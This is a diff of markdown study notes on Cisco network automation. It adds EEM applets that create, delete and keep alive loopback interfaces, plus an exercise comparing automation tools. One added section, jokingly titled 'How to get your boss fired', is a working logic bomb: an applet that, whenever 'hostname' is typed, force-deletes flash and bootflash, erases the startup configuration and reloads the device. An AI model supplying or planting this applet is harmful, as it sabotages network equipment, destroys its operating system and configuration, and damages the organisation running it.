@@ -636,7 +636,7 @@ print(cli_output)
 ~~~
 
 <br>
-____________________
+
 ### Create a Python script that will save the configurations of CoreTAAS, CoreBABA, CUCM, & EDGE
 <br>
 <br>
@@ -966,99 +966,127 @@ Error Occured: {fail}
 &nbsp;
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-## AUTOMATION
-
-
-### Shell Scripts
-1. Output a basic Hello
+## EEM
 ~~~
-@linux
-nano hello.sh
-
-///Edit hello.sh
-echo "hello world"
-///
-
-chmod 500 hello.sh
-./hello.sh
+!@UTM-PH-#$34T#
+conf t
+ int loop 0
+  ip add 1.0.0.1 255.255.255.255
+  desc configured-manually
+  end
 ~~~
 
 <br>
 
-2. Create Multi users
+### 1. Keep interfaces alive
 ~~~
-@linux
-nano add_user.sh
-
-///add_user.sh
-adduser m_user1
-echo "m_user1:C1sc0123" | chpasswd
-
-adduser m_user2
-echo "m_user2:C1sc0123" | chpasswd
-
-adduser m_user3
-echo "m_user3:C1sc0123" | chpasswd
-///
-
-chmod 500 add_user.sh
-./add_user.sh
+!@UTM-PH-#$34T#
+config t
+no event manager applet WatchLo0
+event manager applet WatchLo0
+  event syslog pattern "Interface Loopback0.* down" period 1
+  action 2.0 cli command "enable"
+  action 2.1 cli command "config t"
+  action 2.2 cli command "interface lo0"
+  action 2.3 cli command "no shutdown"
+  action 3.0 syslog msg "BETTER LUCK GagoKA!!,MATIK Loopback0 was brought up via EEM"
+  end
+event manager run WatchLo0
 ~~~
 
+<br>
+
+### 2. Send basic command (loop 7 & 8)
+~~~
+!@UTM-PH-#$34T#
+config t
+no event manager applet addloop
+event manager applet addloop
+  event none
+  action 1.0 puts "What will be the loopback interface number?"
+  action 1.1 puts nonewline "> "
+  action 1.2 gets int 
+  action 2.0 puts "What will be the loopback IP on loopback $int?"
+  action 2.1 puts nonewline "> "
+  action 2.2 gets loopip
+  action 3.0 cli command "enable"
+  action 3.1 cli command "conf t"
+  action 3.2 cli command "interface Loopback $int"
+  action 3.3 cli command "ip address $loopip 255.255.255.255"
+  action 3.4 cli command "desc via-EEM-applet"
+  action 4.0 cli command "end"
+  end
+event manager run addloop
+~~~
 
 
+<br>
 
+### 3. Generate Loopbacks
+~~~
+!@UTM-PH-#$34T#
+config t
+no event manager applet createloop
+event manager applet createloop
+  event none
+  action 1.0 puts "How many Loopback interfaces do you wish to create?"
+  action 1.1 puts nonewline "> "
+  action 1.2 gets num 
+  action 2.0 cli command "enable"
+  action 2.1 cli command "conf t"
+  action 3.0 set i "1"
+  action 3.1 while $i le $num
+  action 3.2  cli command "interface Loopback $i"
+  action 3.3  cli command "ip address $i.$i.$i.$i 255.255.255.255"
+  action 3.4  increment i 1
+  action 3.5 end
+  action 4.0 cli command "end"
+  end
 
+event manager run createloop
+~~~
 
+<br>
 
+### 4. Delete Loopbacks
+~~~
+!@UTM-PH-#$34T#
+config t
+no event manager applet removeloop
+event manager applet removeloop
+  event none
+  action 1.0 puts "How many Loopback interfaces do you wish to create?"
+  action 1.1 puts nonewline "> "
+  action 1.2 gets num 
+  action 2.0 cli command "enable"
+  action 2.1 cli command "conf t"
+  action 3.0 set i "1"
+  action 3.1 while $i le $num
+  action 3.2  cli command "no interface Loopback $i"
+  action 3.4  increment i 1
+  action 3.5 end
+  action 4.0 cli command "end"
+  end
+event manager run removeloop
+~~~
 
+<br>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+### 5. How to get your boss fired
+~~~
+!@UTM-PH-#$34T#
+config t
+no event manager applet byebye
+event manager applet byebye
+  event cli pattern "hostname" sync no skip yes
+  action 1.0 cli command "delete /force /recursive flash:"
+  action 1.1 cli command "delete /force /recursive bootflash:"
+  action 1.2 cli command "erase startup-config"
+  action 2.0 syslog msg "Deleting flash and rebooting the device.. BYE BYE"
+  action 3.0 reload
+  end
+event manager run byebye
+~~~
 
 <br>
 <br>
@@ -1066,117 +1094,65 @@ chmod 500 add_user.sh
 ---
 &nbsp;
 
-## Python
-### Create a Python script that will apply a loopback IP (1.1.1.1/32) to CoreTaas
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
+## Configuration and Infrastructure Management Tools. (Ansible, Terraform, Puppet, & Chef)
 
-### TASK 02: Create a Python script that will save the configurations of CoreTAAS, CoreBABA, CUCM, & EDGE
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
-<br>
 
-<details>
-<summary>Show Answer</summary>
 
-~~~
-from netmiko import ConnectHandler
 
-list_of_device = input('What devices do you want to save configs? [ex. 10.12.1.2 10.12.1.4] ')
-list_of_device = list_of_device.split()
+### Exercise: Configure Cisco using various automation tools.
+Remove all current loopbacks, then create loopbacks via the following methods: 
+| Loopback | IP Address | Method                    |
+| ---      | ---        | ---                       |
+| 1        | 1.1.1.1    | Manually                  |
+| 2        | 2.2.2.2    | Python (using CLI module) |
+| 3        | 3.3.3.3    | Python (using Netmiko)    |
+| 4        | 4.4.4.4    | Ansible                   |
+| 5        | 5.5.5.5    | Terraform                 |
+| 6        | 6.6.6.6    | RESTCONF (Postman)        |
+| 7        | 7.7.7.7    | EEM                       |
 
-### Device Information
-device_info = {
-    'device_type': 'cisco_ios_telnet',
-    'host': '10.#$34T#.1.2',
-    'username': 'admin',
-    'password': 'pass',
-    'secret': 'pass',
-    'port': 23
-}
 
-for host in list_of_device:
-    device_info['host'] = host
-    
-    try:
-        ### Connect to Device
-        access_cli = ConnectHandler(**device_info)
-        access_cli.enable()
 
-        output = access_cli.send_command('wr')
-        print(output)
 
-        ### Close Connection
-        access_cli.disconnect()
-        
-    except Exception as e:
-        print(f'''
-Failed to Connect to Device: {host}:
-Reason for failure: 
-{e}
-              ''')
-~~~
 
-</details>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 <br>
 <br>
